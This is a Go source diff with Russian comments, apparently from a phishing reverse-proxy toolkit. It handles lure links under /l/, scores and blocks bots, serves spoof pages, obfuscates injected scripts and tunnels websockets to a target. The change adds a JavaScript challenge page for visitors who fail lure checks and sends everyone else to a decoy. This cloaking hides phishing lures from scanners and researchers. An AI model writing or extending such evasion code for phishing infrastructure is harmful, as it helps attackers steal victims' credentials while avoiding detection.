@@ -30,6 +30,7 @@ type Engine struct {
 	blocked  core.Blocklist
 	lures    core.LureStore
 	spoof    func(host string) string
+	challenge func() string
 	js       func(src string, seed int64) string
 	limit    Limiter
 	capMu    sync.Mutex
@@ -71,6 +72,9 @@ func (e *Engine) SetGuard(scorer core.BotScorer, blocked core.Blocklist, spoof f
 
 // SetLures — проверка /l/* приманок (опционально).
 func (e *Engine) SetLures(l core.LureStore) { e.lures = l }
+
+// SetChallengePage — interstitial для непройденного challenge (опционально).
+func (e *Engine) SetChallengePage(fn func() string) { e.challenge = fn }
 
 // SetJS — полиморфная обфускация инжектов (опционально).
 func (e *Engine) SetJS(fn func(src string, seed int64) string) { e.js = fn }
@@ -127,12 +131,20 @@ func (e *Engine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	// Lure-check: /l/* обязан существовать (smart: TTL/uses/IP/challenge).
+	// Непройденный challenge — interstitial (проходим за ~2с с JS),
+	// все остальное левое — spoof.
 	if e.lures != nil && len(r.URL.Path) >= 3 && r.URL.Path[:3] == "/l/" {
 		fpOK := cookie(r, "__fp_ok") == "1"
 		if sr, ok := e.lures.(interface {
 			ResolveSmart(path, ip string, fpOK bool) (string, bool)
 		}); ok {
 			if _, ok := sr.ResolveSmart(r.URL.Path, ip, fpOK); !ok {
+				if ch, ok := e.lures.(interface {
+					ChallengeRequired(path, ip string) bool
+				}); ok && ch.ChallengeRequired(r.URL.Path, ip) {
+					e.renderChallenge(w)
+					return
+				}
 				e.renderSpoof(w, r)
 				return
 			}
@@ -643,6 +655,17 @@ func (e *Engine) wsTunnel(w http.ResponseWriter, r *http.Request, target *url.UR
 	case <-r.Context().Done():
 		closeBoth()
 	}
+}
+
+func (e *Engine) renderChallenge(w http.ResponseWriter) {
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	w.Header().Set("X-Content-Type-Options", "nosniff")
+	w.Header().Set("Cache-Control", "no-store")
+	page := "checking…"
+	if e.challenge != nil {
+		page = e.challenge()
+	}
+	_, _ = w.Write([]byte(page))
 }
 
 func (e *Engine) renderSpoof(w http.ResponseWriter, r *http.Request) {
